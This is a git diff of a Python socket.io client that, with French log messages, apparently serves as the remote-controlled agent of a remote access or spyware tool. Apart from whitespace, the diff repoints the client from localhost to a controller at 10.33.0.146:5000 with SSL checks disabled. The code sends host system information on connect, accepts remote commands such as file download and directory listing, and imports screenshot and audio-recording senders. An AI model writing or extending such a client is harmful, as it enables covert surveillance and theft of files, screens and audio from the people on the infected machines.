@@ -13,21 +13,26 @@ from media_utils import take_and_send_screenshot, record_and_send_audio, record_
 
 sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2, ssl_verify=False)
 
+
 def log_event(message):
     print(message)
+
 
 @sio.event
 def connect():
     log_event("Connection réussie")
     sio.emit('system_info', {'os': platform.system(), 'os_version': platform.version(), 'hostname': platform.node()})
 
+
 @sio.event
 def connect_error(data):
     log_event(f"Connection échouée: {data}")
 
+
 @sio.event
 def disconnect():
     log_event("Connection perdue")
+
 
 @sio.event
 def command(data):
@@ -65,6 +70,7 @@ def command(data):
     elif command == 'downloadfile':
         download_file(file_path, sio, user_id)
 
+
 @sio.event
 def start_stream():
     battery_status = get_battery_status()
@@ -90,15 +96,17 @@ def list_directory(data):
             directory = '/'
     list_dir(directory, sio)
 
+
 def get_battery_status():
     battery = psutil.sensors_battery()
     return {'percent': battery.percent, 'power_plugged': battery.power_plugged}
+
 
 def attempt_reconnect():
     while not sio.connected:
         try:
             log_event("Tentative de reconnexion...")
-            sio.connect('https://127.0.0.1:5000', transports=['websocket', 'polling'])
+            sio.connect('https://10.33.0.146:5000', transports=['websocket', 'polling'])
             time.sleep(5)
         except socketio.exceptions.ConnectionError as e:
             log_event("Echec de la reconnexion. Nouvelle tentative dans 5 secondes...")
